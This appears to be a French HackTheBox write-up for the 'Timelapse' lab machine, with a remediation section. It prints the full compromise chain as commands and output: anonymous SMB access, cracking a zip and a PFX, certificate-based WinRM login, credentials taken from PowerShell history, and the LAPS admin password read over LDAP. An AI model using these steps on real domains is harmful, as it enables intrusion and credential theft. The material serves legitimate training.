# Timelapse — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Windows (contrôleur de domaine) |
| **Difficulté** | 🟢 Easy |
| **Date** | 2026-10-06 |
| **Vecteur** | SMB anonyme (`Shares`) → `winrm_backup.zip` → crack zip (`zip2john`) + crack **PFX** (`pfx2john`) → WinRM par **certificat** (`legacyy`) → creds `svc_deploy` dans l'historique PowerShell → **LAPS** (`ms-Mcs-AdmPwd`) lu en LDAP → Administrator |

| **CVE** | — |
| **Tags** | active-directory · pfx · certificat · laps |

> 🎯 **Nouveautés à apprendre (je cherche les commandes seul — cf. `outils/ad-memo.md`)** :
> 1) Une archive protégée + un **certificat `.pfx`** protégé par mot de passe → à **cracker** (pense `*2john`).
> 2) Un `.pfx` sert à s'authentifier en **WinRM par certificat** (pas par mot de passe).
> 3) **LAPS** : le mot de passe de l'admin local est stocké **dans l'AD**, lisible par certains comptes → le lire.

---

## TL;DR

SMB anonyme donne accès au partage **`Shares`** → `Dev/winrm_backup.zip`. Le zip est protégé (`zip2john` →
`supremelegacy`) et contient un **`.pfx`** lui aussi protégé (`pfx2john` → `thuglegacy`). Le PFX est le
certificat client de **`legacyy`** → je l'éclate en `.crt` + `.key` et je me connecte en **WinRM par
certificat** (`evil-winrm -S -c -k`, port **5986**). Dans l'historique PowerShell de legacyy, je trouve
les creds de **`svc_deploy`**, membre de **LAPS_Readers**. LAPS stocke le mdp de l'**Administrateur local**
en clair dans l'attribut **`ms-Mcs-AdmPwd`** de l'objet `DC01$` → je le lis en **LDAP** (pas besoin de shell)
→ `evil-winrm -S` en Administrator → DC.

**Shares → zip+pfx crackés → WinRM par certif (`legacyy`) → historique PS (`svc_deploy`) → LAPS (`ms-Mcs-AdmPwd`) → Administrator.**

## 1. Reconnaissance
```bash
┌──(kali㉿kali)-[~/nmap/Timelapse]
└─$ nmap -sC -sV -p- 10.129.227.113
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-06 15:06 +0200
Nmap scan report for 10.129.227.113
Host is up (0.049s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-10-06 21:09:39Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/wsmans?
|_ssl-date: 2026-10-06T21:11:12+00:00; +8h00m01s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49675/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc             Microsoft Windows RPC
49696/tcp open  msrpc             Microsoft Windows RPC
49697/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-10-06T21:10:33
|_  start_date: N/A
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 299.25 seconds

┌──(kali㉿kali)-[~/nmap/Timelapse]
└─$ nxc smb 10.129.227.113 -u '' -p '' --users 
SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\: 


┌──(kali㉿kali)-[~/nmap/Timelapse]
└─$ smbclient -L //10.129.227.113/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.227.113 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


┌──(kali㉿kali)-[~/nmap/Timelapse]
└─$ smbclient  //10.129.227.113/Shares -N -c 'recurse ON;prompt OFF; mget *'
getting file \Dev\winrm_backup.zip of size 2611 as Dev/winrm_backup.zip (6,7 KiloBytes/sec) (average 6,7 KiloBytes/sec)
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as HelpDesk/LAPS.x64.msi (808,9 KiloBytes/sec) (average 632,7 KiloBytes/sec)
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as HelpDesk/LAPS_Datasheet.docx (329,0 KiloBytes/sec) (average 586,5 KiloBytes/sec)
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as HelpDesk/LAPS_OperationsGuide.docx (963,6 KiloBytes/sec) (average 677,6 KiloBytes/sec)
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as HelpDesk/LAPS_TechnicalSpecification.docx (219,1 KiloBytes/sec) (average 628,4 KiloBytes/sec)

```

## 2. Foothold
```bash
┌──(kali㉿kali)-[~/nmap/Timelapse/Dev]
└─$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
password incorrect--reenter: 
   skipping: legacyy_dev_auth.pfx    incorrect password
                                                                                                       
┌──(kali㉿kali)-[~/nmap/Timelapse/Dev]
└─$ zip2john winrm_backup.zip > hash.txt
Created directory: /home/kali/.john
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8

┌──(kali㉿kali)-[~/nmap/Timelapse/Dev]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2026-10-06 15:30) 1.818g/s 6322Kp/s 6322Kc/s 6322KC/s surkerior..supalove
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(kali㉿kali)-[~/nmap/Timelapse/Dev]
└─$ pfx2john legacyy_dev_auth.pfx > pfx_hash.txt 


┌──(kali㉿kali)-[~/nmap/Timelapse/Dev]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pfx_hash.txt             
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:29 DONE (2026-10-06 15:33) 0.03388g/s 109513p/s 109513c/s 109513C/s thugways..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


┌──(kali㉿kali)-[~/nmap/Timelapse/Dev]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out certificat.crt

┌──(kali㉿kali)-[~/nmap/Timelapse/Dev]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out legacyy.key


──(kali㉿kali)-[~/nmap/Timelapse/Dev]
└─$ evil-winrm -i 10.129.227.113  -c certificat.crt -k legacyy.key -S
```

## 3. Privesc
```bash
*Evil-WinRM* PS C:\Users\legacyy\appdata\roaming\microsoft\windows\powershell\psreadline> cat ConsoleHost_history.txt
 
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit

┌──(kali㉿kali)-[~/nmap/Timelapse/Dev]
└─$ evil-winrm --user svc_deploy -i 10.129.227.113 -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S


┌──(kali㉿kali)-[~/nmap/Timelapse/Dev]
└─$ ldapsearch -x -H ldap://timelapse.htb -D 'svc_deploy@timelapse.htb' \
  -w 'E3R$Q62^12p7PLlC%KWaxuaV' -b 'DC=timelapse,DC=htb' \
  '(sAMAccountName=DC01$)' ms-Mcs-AdmPwd
# extended LDIF
#
# LDAPv3
# base <DC=timelapse,DC=htb> with scope subtree
# filter: (sAMAccountName=DC01$)
# requesting: ms-Mcs-AdmPwd 
#

# DC01, Domain Controllers, timelapse.htb
dn: CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
ms-Mcs-AdmPwd: +RvMi1a+7L.,1@(7f98U4X1Z

```

> **Flag root** : pas sur le bureau d'Administrator → `Get-ChildItem C:\Users -Recurse -Filter root.txt` → `C:\Users\TRX\Desktop\root.txt` (non publié).

## 4. Remédiation

- Ne pas déposer de **sauvegarde de secrets** (zip/pfx) sur un partage lisible ; chiffrer avec des mots de passe forts (pas rockyou-crackables).
- Les **certificats clients WinRM** doivent être protégés comme des mots de passe.
- Ne pas laisser de **creds en clair dans l'historique PowerShell** (`ConsoleHost_history.txt`).
- **LAPS** : limiter strictement l'appartenance à **LAPS_Readers** (lire `ms-Mcs-AdmPwd` = admin local).

## 5. Leçons

- **PFX = cert + clé privée**, protégé par mdp → `pfx2john` + john/hashcat pour casser, puis `openssl pkcs12` pour séparer `.crt` / `.key`. S'authentifier en **WinRM par certificat** : `evil-winrm -S -c cert.crt -k key.key` (port **5986**).
- **`evil-winrm` qui gèle sur « Establishing connection »** = mauvais port. Si `nxc` affiche **`WINRM-SSL ... 5986`**, seul le HTTPS est ouvert → **`-S`** obligatoire (evil-winrm vise le 5985 par défaut).
- **Historique PowerShell** = mine de creds : `type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`.
- **LAPS** : le mdp admin local est en clair dans l'AD (`ms-Mcs-AdmPwd`), lisible par **LAPS_Readers**. Pas besoin d'un shell en svc_deploy : avec ses creds je **lis l'attribut en LDAP** (`nxc ldap --module laps`, ou `ldapsearch ... ms-Mcs-AdmPwd`).
- **Ne pas s'acharner sur un canal cassé** : le WinRM par certif de svc_deploy échouait (certif serveur **expiré**, non contournable) → j'ai pris la voie **LDAP** pour le même objectif (lire une donnée ≠ besoin d'un shell).
- **Flag introuvable** quand on est admin → on **cherche** (`Get-ChildItem -Recurse -Filter root.txt`) au lieu de deviner.

## Références
- Fiches liées : [smb](../outils/smb.md) · [ad-memo](../outils/ad-memo.md) · [hashcat](../outils/hashcat.md)



